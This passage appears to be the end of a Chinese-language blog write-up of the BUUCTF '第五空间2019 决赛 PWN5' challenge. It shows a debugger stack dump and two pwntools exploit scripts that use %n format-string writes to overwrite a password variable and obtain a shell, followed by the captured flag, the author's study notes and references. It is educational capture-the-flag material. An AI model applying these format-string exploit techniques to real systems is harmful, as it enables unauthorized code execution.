+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">b</span><span class="p">:</span><span class="mo">002</span><span class="n">c</span><span class="err">│</span> <span class="n">ecx</span> <span class="mh">0xffffcdf8</span> <span class="err">◂—</span> <span class="mh">0x41414141</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">AAAA</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">c</span><span class="p">:</span><span class="mo">0030</span><span class="err">│</span>         <span class="mh">0xffffcdfc</span> <span class="err">—▸</span> <span class="mh">0xf7ffd00a</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">10</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0xc3a00000</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">d</span><span class="p">:</span><span class="mo">0034</span><span class="err">│</span>         <span class="mh">0xffffce00</span> <span class="err">—▸</span> <span class="mh">0xf7fc4540</span> <span class="p">(</span><span class="n">__kernel_vsyscall</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">ecx</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">e</span><span class="p">:</span><span class="mo">003</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffce04</span> <span class="err">◂—</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0f</span><span class="o">:</span><span class="mo">003</span><span class="n">c</span><span class="err">│</span>         <span class="mh">0xffffce08</span> <span class="err">—▸</span> <span class="mh">0x8048034</span> <span class="err">◂—</span> <span class="mh">0x6</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="o">:</span><span class="mo">0040</span><span class="err">│</span>         <span class="mh">0xffffce0c</span> <span class="err">—▸</span> <span class="mh">0xf7fc66d0</span> <span class="err">◂—</span> <span class="mh">0xe</span>
+</span></span><span class="line"><span class="cl"><span class="mi">11</span><span class="o">:</span><span class="mo">0044</span><span class="err">│</span>         <span class="mh">0xffffce10</span> <span class="err">—▸</span> <span class="mh">0xf7ffd608</span> <span class="p">(</span><span class="n">_rtld_global</span><span class="o">+</span><span class="mi">1512</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xf7fc6000</span> <span class="err">◂—</span> <span class="mh">0x464c457f</span>
+</span></span><span class="line"><span class="cl"><span class="mi">12</span><span class="o">:</span><span class="mo">004</span><span class="mi">8</span><span class="err">│</span>         <span class="mh">0xffffce14</span> <span class="err">◂—</span> <span class="mh">0x20</span> <span class="cm">/* &#39; &#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mi">13</span><span class="o">:</span><span class="mo">004</span><span class="n">c</span><span class="err">│</span>         <span class="mh">0xffffce18</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">14</span><span class="o">:</span><span class="mo">0050</span><span class="err">│</span>         <span class="mh">0xffffce1c</span> <span class="err">—▸</span> <span class="mh">0xffffcf9c</span> <span class="err">◂—</span> <span class="mh">0x20</span> <span class="cm">/* &#39; &#39; */</span>
+</span></span><span class="line"><span class="cl"><span class="mi">15</span><span class="o">:</span><span class="mo">0054</span><span class="err">│</span>         <span class="mh">0xffffce20</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span> <span class="err">↓</span>        <span class="mi">2</span> <span class="n">skipped</span>
+</span></span></code></pre></div><p>可以看到我们输入的内容是函数的第10个参数，偏移量为10</p>
+<p>又在IDA中观察到<code>dword_804C044</code>的地址是0x804C044</p>
+<p>大体方向清楚了，现在我们就可以写payload了</p>
+<h3 id="exp">EXP</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25038</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p=process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">adr</span> <span class="o">=</span> <span class="mh">0x804c044</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">adr</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;%10$n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># flag{afc6dd95-5d8e-496c-b029-e30d56c5921b}</span>
+</span></span></code></pre></div><p>我们对<code>buf</code>先传入<code>dword_804C044</code>的地址，紧接着传入格式化占位符<code>%10$n</code>，然后对<code>nptr</code>传入我们的修改值0x04，完成比较并成功调用<code>system(&quot;/bin/sh&quot;);</code>获得shell</p>
+<p>这样做的目的在于将目标地址写入栈中第10个参数也就是我们的输入中，并利用占位符访问第10个参数的内容指向的地址并修改为相应的值0x04（因为是32位，一个地址长4位，<code>%n</code>写入值0x04），这时再将密码输入为0x40就完成了判断</p>
+<p>当然，你也可以这样写</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25038</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p=process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">adr</span> <span class="o">=</span> <span class="mh">0x804c044</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">adr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">adr</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">adr</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">adr</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;%10$n%11$n%12$n%13$n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x10101010</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>因为这时读入了四个地址，全长16位，所以四个<code>%n</code>都将写入0x10，也就是0x10101010</p>
+<h2 id="杂谈">杂谈</h2>
+<p>这是我入坑pwn以来学习的第二个漏洞，也许是因为对老手来说太基础，网上的wp都不讲人话，困扰了我整整两天；这回终于被我搞懂了，熬夜也要赶紧记下来免得忘了（悲）</p>
+<p>这道题其实还有另一种解法，是利用pwntools的<code>fmtstr_payload</code>函数直接修改内容，等我搞懂了再来<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_8">补充</a></p>
+<p>pwn是真的难，基础知识又多又底层，一周干完实模式汇编去看操作系统结果发现人用的保护模式，看得我头昏脑涨，无奈跑回去看CSAPP（不得不说是本神书，处在不同的水平看都会有不同的收获），现在属于CSAPP、操作系统、编译原理三线程并行，以后还想跟着书写个小OS加深理解，希望到期末我还能活下来吧（）</p>
+<p><img alt="img" src="./img/20221011111.jpg"></p>
+<p><strong>这张图很好地诠释了我现在的心理状态</strong></p>
+<p>快两点了，明天早八，睡了反转了，英语网课（喜）</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li>
+<p>[<em>BUUCTF</em>](<a href="https://buuoj.cn/challenges#[">https://buuoj.cn/challenges#[</a>第五空间2019 决赛]PWN5)</p>
+</li>
+<li>
+<p><em><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">CTFwiki</a></em></p>
+</li>
+<li>
+<p><em><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">维基百科</a></em></p>
+</li>
+<li>
+<p>CSDN</p>
+<ul>
+<li><em>[<a href="https://blog.csdn.net/qq_41696518/article/details/125771666">第五空间2019 决赛]PWN5 ——两种解法</a></em></li>
+<li><em>[writeUP-<a href="https://blog.csdn.net/weixin_52111404/article/details/126113277">第五空间2019 决赛]PWN5(待进一步完善待研究内容)</a></em></li>
+<li><em>[[BUUCTF]PWN——[第五空间2019 决赛]PWN5](https://blog.csdn.net/BangSen1/article/details/115191602?ops_request_misc=%7B%22request%5Fid%22%3A%22166609852016782428676118%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=166609852016782428676118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-12-115191602-null-null.142^v59^pc_rank_34_1,201^v3^control_2&amp;utm_term=第五空间2019 决赛]PWN5&amp;spm=1018.2226.3001.4187)</em></li>
+<li><em>[[第五空间2019 决赛]PWN5](https://blog.csdn.net/weixin_56301399/article/details/125919683?ops_request_misc=%7B%22request%5Fid%22%3A%22166609852016782428676118%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=166609852016782428676118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-125919683-null-null.142^v59^pc_rank_34_1,201^v3^control_2&amp;utm_term=第五空间2019 决赛]PWN5&amp;spm=1018.2226.3001.4187)</em></li>
+</ul>
+</li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/ASUKA39" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 a39.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
